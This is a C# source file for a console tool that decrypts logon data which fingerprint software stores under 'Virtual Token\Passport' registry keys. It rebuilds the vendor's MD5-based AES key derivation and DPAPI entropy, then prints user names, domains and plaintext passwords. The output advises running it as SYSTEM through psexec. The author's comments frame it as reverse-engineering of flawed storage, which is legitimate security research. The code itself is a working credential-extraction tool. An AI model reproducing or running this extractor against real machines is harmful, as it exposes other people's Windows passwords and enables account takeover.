using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace FingerprintEncryption
{
  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  internal struct DATA_BLOB
  {
    public int cbData;
    public IntPtr pbData;
  }

  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
  internal struct CRYPTPROTECT_PROMPTSTRUCT
  {
    public int cbSize;
    public int dwPromptFlags;
    public IntPtr hwndApp;
    public string szPrompt;
  }

  class Startup
  {
    [DllImport("crypt32.dll",
                    SetLastError = true,
                    CharSet = System.Runtime.InteropServices.CharSet.Auto)]
    private static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText,
                                ref string pszDescription,
                                ref DATA_BLOB pEntropy,
                                    IntPtr pReserved,
                                ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
                                    int dwFlags,
                                ref DATA_BLOB pPlainText);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr LocalFree(IntPtr hMem);

    private static bool _verbose = false;

    //NOTE: This only seems to decrypt "ExData", not the other one, which is okay I guess since it has more data.
    //      It's structured in such a way that hopefully it'll work for other key lengths besides just 56.
    //      It currently tries to decrypt any "ExData" values in either 32-bit or 64-bit registries
    //        and displays the Unicode strings within.
    //      I haven't figured out the format of the data yet -- not easy to traverse at first glance.
    //The storage of this information is fundamentally flawed, and I don't really want to play this cat-and-mouse
    //  game anymore, so this is probably the last update.
    //Forgive the awfulness that is this code file.
    static void Main(string[] args)
    {
      try
      {
        //Display basic stuff
        var asm = System.Reflection.Assembly.GetExecutingAssembly().GetName();
        Console.WriteLine(asm.Name + " v" + asm.Version.ToString(3));
        Console.WriteLine("This application attempts to extract your logon information");
        Console.WriteLine(" from one or more encrypted registry keys.");

        //Parse command line arguments
        foreach (var arg in args)
        {
          var a = arg.Trim(new char[] { '-', '/' });
          if (a.Contains("v"))
            _verbose = true;
          else if (a.Contains("h"))
          {
            //Display help
            Console.WriteLine("Options:");
            Console.WriteLine("-v\tVerbose mode; display all strings from registry key.");
            Console.WriteLine("-h\tDisplay this help text.");
            Console.WriteLine();

            return;
          }
        }

        //Get busy...
        Console.WriteLine();
        Console.WriteLine("Working...");

        //Check all the registry keys we know of...
        int count = 0;
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\Passport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\LocalPassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\DevicePassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\VoidPassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\Passport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\LocalPassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\DevicePassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\VoidPassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\Passport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\LocalPassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\DevicePassport");
        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\VoidPassport");

        //Display counts and get out
        Console.WriteLine();
        Console.WriteLine(String.Format("Done ({0} {1} found).", count, count == 1 ? "entry" : "entries"));
      }
      catch (Exception ex)
      {
        Console.WriteLine("ERROR: " + (_verbose ? ex.ToString() : ex.Message));
        Console.WriteLine();
        Console.WriteLine("Try running as NT AUTHORITY\\SYSTEM first");
        Console.WriteLine("  (AKA \"psexec.exe -s -i cmd.exe\") to see if it helps.");
      }
    }

    private static int _ScanRegistryKey(string subKey)
    {
      int ret = 0;

      //Deal with 32-bit version
      var reg32 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
      var key32 = reg32.OpenSubKey(subKey);
      if (key32 != null)
      {
        //Fetch all the 32-bit keys
        foreach (var name in key32.GetSubKeyNames())
        {
          var r = key32.OpenSubKey(name);
          foreach (var val in r.GetValueNames())
          {
            //Handle this key value
            if (_HandleKeyValue(r.Name, val, (byte[])r.GetValue(val))) ret++;
          }
        }
      }

      //Deal with 64-bit version
      var reg64 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64);
      var key64 = reg64.OpenSubKey(subKey);
      if (key64 != null)
      {
        //Fetch all the 64-bit keys
        foreach (var name in key64.GetSubKeyNames())
        {
          var r = key64.OpenSubKey(name);
          foreach (var val in r.GetValueNames())
          {
            //Handle this key value
            if (_HandleKeyValue(r.Name, val, (byte[])r.GetValue(val))) ret++;
          }
        }
      }

      return ret;
    }

    private static bool _HandleKeyValue(string key, string name, byte[] raw)
    {
      bool ret = false;

      //HACK: Since this currently only supports ExData, only look for it...
      if (name == "ExData")
      {
        //We'll consider this "found"
        ret = true;

        //Display initial information
        Console.WriteLine(String.Format("Found {0}, name {1}:", key, name));

        //Extract the relevant pieces of information
        int header = _GetInt(raw, 0);
        int type = _GetInt(raw, 4);
        int bitLength = _GetInt(raw, 16);
        byte[] encryptedBlock = null;
        int dataOffset = 20;
        if (type >= 0x05)
        {
          //Starting with type 0x05, we get a new DPAPI-encrypted seed to produce the passphrase
          encryptedBlock = new byte[_GetInt(raw, dataOffset)];
          Array.Copy(raw, dataOffset + 4, encryptedBlock, 0, encryptedBlock.Length);
          dataOffset += 4 + encryptedBlock.Length + 2;
        }
        var data = new byte[_GetInt(raw, dataOffset)];
        Array.Copy(raw, dataOffset + 4, data, 0, data.Length);
        var iv = new byte[_GetInt(raw, dataOffset + 4 + data.Length)];
        Array.Copy(raw, dataOffset + 4 + data.Length + 4, iv, 0, iv.Length);

        if (_verbose)
        {
          Console.WriteLine(String.Format("\tHeader: {0}", header.ToString("X4")));
          Console.WriteLine(String.Format("\tType: {0}", type.ToString("X4")));
          Console.WriteLine(String.Format("\tBit length: {0}", bitLength.ToString()));
          if (type >= 0x05) Console.WriteLine(String.Format("\tSeed length: {0}", encryptedBlock.Length.ToString()));
          Console.WriteLine(String.Format("\tIV length: {0}", iv.Length.ToString("X4")));
          Console.WriteLine(String.Format("\tDecrypting {0} data bytes...", data.Length.ToString("X4")));
        }

        //Get the passphrase (for types 0x04 and below, it's NULL (*sigh*...), and it's a little more involved for 0x05+
        byte[] passphrase = null;
        if (type >= 0x05)
        {
          //Decrypt the DPAPI-encrypted seed
          var decryptedBlock = _DecryptBlock(encryptedBlock);

          //SHA1 hash the old passphrase + this seed to produce the new passphrase
          var sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider();
          passphrase = sha1.ComputeHash(_Merge(passphrase, decryptedBlock));
        }

        //Get the main data/strings
        var output = _DecryptData(data, iv, bitLength, passphrase);
        if (output[8] == 'P' && output[9] == 'S' && output[10] == '1')
        {
          if (_verbose) Console.WriteLine("\tDecryption successful!");

          //HACK: Really dumb parsing of the string data since
          //  I can't seem to figure it out yet...
          //Look for B0 04 00 00, and if found, look at the previous int
          //  for the size and rip it out
          int i = 11;
          if (_verbose) Console.WriteLine("\tStrings:");
          var lastString = String.Empty;
          while (i < output.Length)
          {
            if (output[i] == 0xB0 && output[i + 1] == 0x04 &&
              output[i + 2] == 0x00 && output[i + 3] == 0x00)
            {
              //Get the size
              int size = _GetInt(output, i - 4);
              
              //Rip out the data
              var str = UnicodeEncoding.Unicode.GetString(output,
                i + 4, size).TrimEnd('\0');

              //Display it
              if (_verbose)
              {
                Console.WriteLine("\t\t" + str);
              }
              else
              {
                switch (lastString.ToLower())
                {
                  case "0x11":
                    {
                      Console.WriteLine("\t\tUser name:\t" + str);
                      break;
                    }
                  case "0x12":
                    {
                      if (str.ToLower() != "p1" && str.ToLower() != "0x11" &&
                        str.ToLower() != "0x12")
                        Console.WriteLine("\t\tDomain:\t" + str);
                      break;
                    }
                  case "p1":
                    {
                      if (type != 0x05)
                        Console.WriteLine("\t\tPassword:\t" + str);
                      break;
                    }
                  default:
                    {
                      //Uh? Oh well...
                      break;
                    }
                }
              }

              //Save it for next iteration
              lastString = str;
            }

            i++;
          }

          //For types 0x05 and above, the password is encrypted separately -- get it
          if (!_verbose && type >= 0x05)
          {
            //HACK: Not exactly sure how to parse the above data, so just look for a block with a specific size
            var index = _FindBytes(output, new byte[] { 0xF6, 0x00, 0x00, 0x00 });
            var passwordBlock = new byte[_GetInt(output, index.Value)];
            Array.Copy(output, index.Value + 4, passwordBlock, 0, passwordBlock.Length);
            var decryptedPassword = _DecryptBlock(passwordBlock);

            Console.WriteLine("\t\tPassword:\t" +
              UnicodeEncoding.Unicode.GetString(decryptedPassword).TrimEnd('\0'));
          }
        }
        else
        {
          if (_verbose) Console.WriteLine("\tDecryption error!");
        }
      }

      return ret;
    }

    private static int _GetInt(byte[] raw, int offset)
    {
      return (raw[offset] | (raw[offset + 1] << 8) |
        (raw[offset + 2] << 16) | (raw[offset + 3] << 24));
    }

    private static int? _FindBytes(byte[] haystack, byte[] needle)
    {
      int? ret = null;

      for (int i = 0; i < haystack.Length; i++)
      {
        bool found = true;

        for (int j = 0; j < needle.Length; j++)
        {
          if (haystack[i + j] != needle[j])
          {
            found = false;
            break;
          }
        }

        if (found)
        {
          ret = i;
          break;
        }
      }

      return ret;
    }

    private static byte[] _DecryptBlock(byte[] encryptedBlock)
    {
      const int ENTROPY_LENGTH = 0x86;
      const string ENTROPY_DATA = "Software"; //Really? *Really*?
      var entropyData = new byte[ENTROPY_LENGTH];

      //Create the prompt structure for CryptUnprotectData
      CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
      prompt.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
      prompt.dwPromptFlags = 0;
      prompt.hwndApp = IntPtr.Zero;
      prompt.szPrompt = null;

      //Build the entropy structure
      DATA_BLOB entropy = new DATA_BLOB();
      entropy.cbData = entropyData.Length;
      Array.Copy(Encoding.ASCII.GetBytes(ENTROPY_DATA), 0, entropyData, 0, ENTROPY_DATA.Length);
      IntPtr ptrEntropy = Marshal.AllocHGlobal(entropyData.Length);
      entropyData[0x2B] = 0x01; //anti-debugging magic
      entropyData[0x43] = 0x05;
      Marshal.Copy(entropyData, 0, ptrEntropy, entropyData.Length);
      entropy.pbData = ptrEntropy;

      //Build the cipher text structure
      DATA_BLOB cipherText = new DATA_BLOB();
      IntPtr ptrCipher = Marshal.AllocHGlobal(encryptedBlock.Length);
      Marshal.Copy(encryptedBlock, 0, ptrCipher, encryptedBlock.Length);
      cipherText.cbData = encryptedBlock.Length;
      cipherText.pbData = ptrCipher;

      //Do the decryption
      DATA_BLOB plainText = new DATA_BLOB();
      var description = String.Empty; //Not using a description
      if (!CryptUnprotectData(ref cipherText, ref description, ref entropy, IntPtr.Zero, ref prompt, 0, ref plainText))
        throw new InvalidOperationException("DPAPI decryption error: " + Marshal.GetLastWin32Error().ToString("X8"));

      //Get the decrypted data into our object
      var decrypted = new byte[plainText.cbData];
      Marshal.Copy(plainText.pbData, decrypted, 0, plainText.cbData);

      //Free everything up
      LocalFree(plainText.pbData);
      Marshal.FreeHGlobal(ptrEntropy);
      Marshal.FreeHGlobal(ptrCipher);

      return decrypted;
    }

    private static byte[] _DecryptData(byte[] data, byte[] IV, int bitLength, byte[] passphrase)
    {
      var aes = new System.Security.Cryptography.AesCryptoServiceProvider();
      var iv = new byte[16]; //always 16 for AES
      var key = new byte[IV.Length == 7 ? 32 : IV.Length / 8]; //HACK: for "AES-56", convert to AES-256
      var ret = new byte[data.Length];

      //Pad the IV if necessary
      Array.Copy(IV, iv, IV.Length);

      //Derive the key
      var derived = _DeriveEncryptionKey(bitLength, passphrase);
      Array.Copy(derived, key, derived.Length);

      //Decrypt it!
      aes.CreateDecryptor(key, iv).TransformBlock(data, 0, data.Length, ret, 0);

      return ret;
    }

    private static byte[] _DeriveEncryptionKey(int bitLength, byte[] passphrase)
    {
      //Key derivation logic:
      //  Constant array is concatenated with passphrase and MD5 hashed.
      //  For a certain number of iterations:
      //    The passphrase is concatenated with the previous hash, MD5 hashed, and then used as the new hash.
      //  The number of bytes required for the requested key is calculated.
      //  For each byte of the key:
      //    Calculate the MD5 hash of the previous hash.
      //    Use the 12th byte as part of the key.
      const int ITERATIONS = 1000;
      byte[] start = { 0xEA, 0x59, 0x40, 0xC3, 0xB9, 0x41, 0x9C, 0xD2, 0xEB, 0x72, 0x96, 0xEF, 0x70, 0xD9, 0xAA, 0x2F };
      var md5 = new MD5CryptoServiceProvider();
      byte[] hash = md5.ComputeHash(_Merge(start, passphrase));

      for (int i = 0; i < ITERATIONS; i++)
        hash = md5.ComputeHash(_Merge(passphrase, hash));
      var key = new byte[(bitLength + 7) / 8];
      for (int i = 0; i < key.Length; i++)
      {
        hash = md5.ComputeHash(hash);
        key[i] = hash[11];
      }

      return key;
    }

    //Just merges two arrays. You can pass NULL for either (or both?!).
    private static byte[] _Merge(byte[] first, byte[] second)
    {
      var ret = new byte[(first != null ? first.Length : 0) + (second != null ? second.Length : 0)];

      if (first != null)
        Array.Copy(first, ret, first.Length);
      if (second != null)
        Array.Copy(second, 0, ret, (first != null ? first.Length : 0), second.Length);

      return ret;
    }
  }
}
